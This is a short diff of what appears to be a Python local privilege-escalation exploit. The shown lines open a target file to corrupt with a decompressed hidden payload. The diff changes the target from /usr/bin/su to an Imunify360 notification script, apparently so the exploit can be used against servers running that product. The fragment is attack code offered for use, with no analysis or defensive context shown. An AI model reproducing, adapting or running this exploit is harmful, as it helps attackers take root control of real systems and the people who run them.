@@ -41,7 +41,7 @@ def exploit_step(fd: int, offset: int, data: bytes) -> None:
 
 def main():
     # Open /usr/bin/su to corrupt
-    su_fd = os.open("/usr/bin/su", os.O_RDONLY)
+    su_fd = os.open("/opt/imunify360/venv/share/imunify360/scripts/send-notifications", os.O_RDONLY)
     
     # Decompress payload
     payload = zlib.decompress(hex_to_bytes(PAYLOAD_COMPRESSED))
